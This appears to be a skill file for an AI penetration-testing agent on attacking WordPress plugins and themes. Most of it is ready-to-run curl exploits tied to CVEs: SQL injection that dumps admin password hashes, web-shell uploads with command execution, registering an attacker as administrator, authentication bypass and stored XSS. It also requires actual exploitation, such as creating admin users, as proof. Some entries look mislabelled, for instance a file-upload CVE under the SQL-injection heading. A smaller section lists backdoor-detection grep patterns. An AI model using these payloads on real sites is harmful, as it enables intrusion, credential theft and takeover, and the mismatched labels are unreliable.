---
name: wordpress-packages
description: WordPress plugin and theme vulnerability testing - common vulnerabilities, CVE exploitation, backdoor detection, supply chain attacks
---

# WordPress Plugin & Theme Vulnerability Testing

## ⚠️ CRITICAL: Exploitation Required for Reporting

**NEVER report a vulnerability based solely on tool output or version detection.**

### The Golden Rule
- **Tool says "vulnerable"** = Potential vulnerability (NOT reportable)
- **Successfully exploited with proof** = Confirmed vulnerability (REPORTABLE)

### What Constitutes Valid Proof

#### SQL Injection
❌ **NOT VALID**: "WPScan says plugin version is vulnerable to SQLi"
✅ **VALID**: 
- Extracted database version: `MySQL 8.0.32`
- Dumped admin credentials: `admin:$P$B55D6LjfHDkINU5wF.v2BuuzO0/XPk/`
- Screenshot of successful UNION-based extraction

#### File Upload/RCE
❌ **NOT VALID**: "Plugin has known file upload vulnerability"
✅ **VALID**:
- Uploaded `shell.php` successfully
- Accessed shell at `/wp-content/uploads/shell.php`
- Executed `whoami` command, got output: `www-data`
- Screenshot of command execution

#### XSS
❌ **NOT VALID**: "Plugin doesn't sanitize input"
✅ **VALID**:
- Injected `<script>alert(document.cookie)</script>`
- Payload executed in browser
- Captured session cookie: `PHPSESSID=abc123...`
- Screenshot of alert box with cookie

#### Authentication Bypass
❌ **NOT VALID**: "Plugin has auth bypass CVE"
✅ **VALID**:
- Bypassed login without credentials
- Accessed `/wp-admin/` as administrator
- Screenshot of admin dashboard
- Created new admin user as proof

### Exploitation Workflow

1. **Detect**: Tool identifies potential vulnerability
2. **Verify**: Manually test if vulnerability exists
3. **Exploit**: Actually exploit the vulnerability
4. **Document**: Capture proof (screenshots, command output, extracted data)
5. **Report**: Only report with full exploitation proof

### Proof Requirements

Every vulnerability report MUST include:
- **Exploitation steps**: Exact commands/requests used
- **Evidence**: Screenshots, command output, extracted data
- **Impact**: What you achieved (admin access, data extraction, etc.)
- **Reproducibility**: Clear steps to reproduce the exploit

### Common Mistakes to Avoid

❌ Reporting based on:
- Version number alone
- Tool output without exploitation
- "Potential" or "possible" vulnerabilities
- Theoretical attack vectors
- Unsuccessful exploitation attempts

✅ Only report when you have:
- Successfully exploited the vulnerability
- Concrete proof of exploitation
- Demonstrated real impact
- Reproducible steps

---

## Plugin Enumeration

### Discover Installed Plugins
```bash
# Use wpscan to enumerate plugins
wpscan --url https://target.com --enumerate ap --api-token $WPSCAN_API_KEY

# Manual enumeration via readme.txt
curl -s https://target.com/wp-content/plugins/ | grep -o 'href="[^"]*"' | grep -v "\.\."

# Check common plugins
for plugin in contact-form-7 woocommerce elementor yoast-seo wordfence; do
  echo "=== $plugin ==="
  curl -s https://target.com/wp-content/plugins/$plugin/readme.txt | head -10
done

# Check plugin versions
curl -s https://target.com/wp-content/plugins/PLUGIN_NAME/readme.txt | grep "Stable tag"
```

### Plugin Fingerprinting
```bash
# Check plugin JavaScript/CSS files for version
curl -s https://target.com/wp-content/plugins/PLUGIN_NAME/assets/js/script.js | grep -i "version"

# Check plugin main file
curl -s https://target.com/wp-content/plugins/PLUGIN_NAME/PLUGIN_NAME.php | grep -E "Version:|@version"

# Use wpscan for detailed enumeration
wpscan --url https://target.com --enumerate vp --api-token $WPSCAN_API_KEY
```

## Common Plugin Vulnerabilities

### SQL Injection in Plugins

**Contact Form 7 (< 5.3.2)**
```bash
# CVE-2020-35489 - Unrestricted file upload
curl -X POST https://target.com/wp-json/contact-form-7/v1/contact-forms/1/feedback \
  -F "file=@shell.php.jpg" \
  -F "_wpcf7=1" \
  -F "_wpcf7_version=5.3.1"

# Check if file uploaded
curl -s https://target.com/wp-content/uploads/wpcf7_uploads/
```

**WooCommerce (< 3.4.5)**
```bash
# CVE-2018-16341 - SQL injection in product search
curl "https://target.com/?s=test&post_type=product&orderby=price&order=ASC' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--"

# Extract database version
curl "https://target.com/?s=test&post_type=product&orderby=price&order=ASC' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,version()--"
```

**Easy WP SMTP (< 1.4.0)**
```bash
# CVE-2020-35558 - SQL injection in search
curl "https://target.com/wp-admin/admin-ajax.php?action=swpsmtp_clear_log&search=test' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,user_login,21,22,23,24,25,26,27,28,29,user_pass,31,32,33,34,35,36,37,38,39,40 FROM wp_users--"
```

### Cross-Site Scripting (XSS) in Plugins

**Elementor (< 3.1.0)**
```bash
# CVE-2021-21701 - Stored XSS in widget
curl -X POST https://target.com/wp-admin/admin-ajax.php \
  -d "action=elementor_ajax" \
  -d "actions={\"elementor-action\":{\"action\":\"save_builder\",\"data\":{\"post_id\":1,\"elements\":[{\"id\":\"test\",\"elType\":\"widget\",\"settings\":{\"text\":\"<script>alert(1)</script>\"},\"widgetType\":\"text-editor\"}]}}}"
```

**Yoast SEO (< 14.1)**
```bash
# CVE-2020-13925 - XSS in meta description
curl -X POST https://target.com/wp-admin/post.php \
  -d "post=1" \
  -d "action=editpost" \
  -d "yoast_free_metabox_nonce=NONCE" \
  -d "yoast_wpseo_metadesc=<script>alert(1)</script>"
```

### Remote Code Execution (RCE) in Plugins

**File Manager (< 6.9)**
```bash
# CVE-2020-25213 - Unauthenticated file upload
curl -X POST "https://target.com/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php?cmd=upload&target=l1_Lw" \
  -F "reqid=171c59c98fcd1" \
  -F "cmd=upload" \
  -F "target=l1_Lw" \
  -F "upload[]=shell.php;filename=shell.php"

# Access shell
curl "https://target.com/wp-content/plugins/wp-file-manager/lib/files/shell.php?cmd=id"
```

**ThemeGrill Demo Importer (< 1.6.2)**
```bash
# CVE-2020-28736 - SQL injection leading to RCE
curl -X POST "https://target.com/wp-admin/admin-ajax.php" \
  -d "action=themegrill_demo_importer_reset" \
  -d "demo_import_id=1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--"
```

### Privilege Escalation in Plugins

**Ultimate Member (< 2.1.4)**
```bash
# CVE-2020-10389 - Privilege escalation via registration
curl -X POST "https://target.com/wp-admin/admin-ajax.php" \
  -d "action=um_submit_form_register" \
  -d "form_id=1" \
  -d "user_login=attacker" \
  -d "user_password=Password123!" \
  -d "user_email=attacker@evil.com" \
  -d "role=administrator"

# Login as administrator
curl -X POST "https://target.com/wp-login.php" \
  -d "log=attacker" \
  -d "pwd=Password123!" \
  -d "wp-submit=Log+In"
```

### Authentication Bypass in Plugins

**Social Login (< 4.9.1)**
```bash
# CVE-2020-35800 - Authentication bypass
curl -X POST "https://target.com/wp-admin/admin-ajax.php" \
  -d "action=asl_auth" \
  -d "provider=google" \
  -d "email=admin@target.com" \
  -d "name=Admin" \
  -d "photo=https://example.com/photo.jpg"

# Response includes authentication cookie
# Set-Cookie: wordpress_logged_in_...
```

## Theme Vulnerabilities

### Theme Enumeration
```bash
# Use wpscan to enumerate themes
wpscan --url https://target.com --enumerate at --api-token $WPSCAN_API_KEY

# Manual enumeration
curl -s https://target.com/wp-content/themes/ | grep -o 'href="[^"]*"' | grep -v "\.\."

# Check theme version
curl -s https://target.com/wp-content/themes/THEME_NAME/style.css | grep "Version:"
```

### Theme Vulnerabilities

**Divi Theme (< 4.0.10)**
```bash
# CVE-2020-13428 - Stored XSS in module
curl -X POST "https://target.com/wp-admin/admin-ajax.php" \
  -d "action=save_builder" \
  -d "post_id=1" \
  -d "builder_content=[{\"module\":\"code\",\"attrs\":{\"content\":\"<script>alert(1)</script>\"}}]"
```

**Flavor Theme (< 1.2.0)**
```bash
# CVE-2020-11733 - Unrestricted file upload
curl -X POST "https://target.com/wp-admin/admin-ajax.php" \
  -F "action=flavor_upload_logo" \
  -F "file=@shell.php"

# Access shell
curl "https://target.com/wp-content/uploads/flavor-logo/shell.php?cmd=id"
```

## Supply Chain Attacks

### Vulnerable Plugin Dependencies
```bash
# Check plugin dependencies
curl -s https://target.com/wp-content/plugins/PLUGIN_NAME/PLUGIN_NAME.php | grep -i "require\|include"

# Look for:
# - Outdated libraries (jQuery, Bootstrap, etc.)
# - Vulnerable PHP libraries
# - Unmaintained dependencies

# Check composer.json if present
curl -s https://target.com/wp-content/plugins/PLUGIN_NAME/composer.json | jq '.require'
```

### Backdoor Detection
```bash
# Search for suspicious code patterns
curl -s https://target.com/wp-content/plugins/PLUGIN_NAME/PLUGIN_NAME.php | grep -iE "(eval|base64_decode|gzinflate|str_rot13|shell_exec|exec|system|passthru)"

# Check for obfuscated code
curl -s https://target.com/wp-content/plugins/PLUGIN_NAME/PLUGIN_NAME.php | grep -E "\\\$[a-zA-Z0-9_]+\s*=\s*['\"][a-zA-Z0-9+/=]+['\"]"

# Look for suspicious file operations
curl -s https://target.com/wp-content/plugins/PLUGIN_NAME/PLUGIN_NAME.php | grep -iE "(fopen|fwrite|file_put_contents|move_uploaded_file)"

# Check for network connections
curl -s https://target.com/wp-content/plugins/PLUGIN_NAME/PLUGIN_NAME.php | grep -iE "(curl_exec|file_get_contents|fsockopen|socket_create)"
```

### Malicious Plugin Detection
```bash
# Check plugin repository
# https://wordpress.org/plugins/PLUGIN_NAME/

# Look for:
# - Low download count
# - Poor reviews
# - No recent updates
# - Suspicious author information

# Verify plugin hash
# Download official plugin from wordpress.org
# Compare hash with installed version
sha256sum plugin-name.zip
```

## Testing Checklist

- [ ] Enumerate installed plugins (wpscan, manual)
- [ ] Check plugin versions against known CVEs
- [ ] Test for SQL injection in plugin parameters
- [ ] Test for XSS in plugin input fields
- [ ] Test for file upload vulnerabilities
- [ ] Test for RCE via vulnerable plugins
- [ ] Test for privilege escalation
- [ ] Test for authentication bypass
- [ ] Enumerate installed themes
- [ ] Check theme versions against known CVEs
- [ ] Test for XSS in theme options
- [ ] Test for file upload in theme customizer
- [ ] Check plugin dependencies for vulnerabilities
- [ ] Search for backdoors in plugin code
- [ ] Verify plugin authenticity (hash comparison)
- [ ] Check for malicious plugins (low downloads, poor reviews)

## Tools

```bash
# WPScan (primary tool)
wpscan --url https://target.com --api-token $WPSCAN_API_KEY --enumerate ap,at,vp,vt

# WordPress Exploit Framework
# https://github.com/rastating/wordpress-exploit-framework

# Plecost (WordPress fingerprinting)
# https://github.com/iniqua/plecost

# WPSeku (WordPress vulnerability scanner)
# https://github.com/m4ll0k/WPSeku

# Nuclei templates for WordPress
nuclei -u https://target.com -t ~/nuclei-templates/cves/wordpress/
nuclei -u https://target.com -t ~/nuclei-templates/exposed-panels/wordpress/
```

## Real-World Impact

**Case 1: Vulnerable Plugin Leading to RCE**
- Plugin: File Manager 6.8
- Vulnerability: CVE-2020-25213 (unauthenticated file upload)
- Impact: Uploaded web shell, full site compromise

**Case 2: SQL Injection in WooCommerce**
- Plugin: WooCommerce 3.4.4
- Vulnerability: CVE-2018-16341 (SQL injection in product search)
- Impact: Extracted admin credentials, took over site

**Case 3: Backdoor in Nulled Theme**
- Theme: Flavor (nulled version from third-party site)
- Finding: Obfuscated PHP code executing remote payload
- Impact: Site added to botnet, used for DDoS attacks

**Case 4: Supply Chain Attack via Plugin Update**
- Plugin: Popular SEO plugin
- Attack: Compromised plugin repository, injected malicious code
- Impact: 100,000+ sites compromised, cryptocurrency miner installed
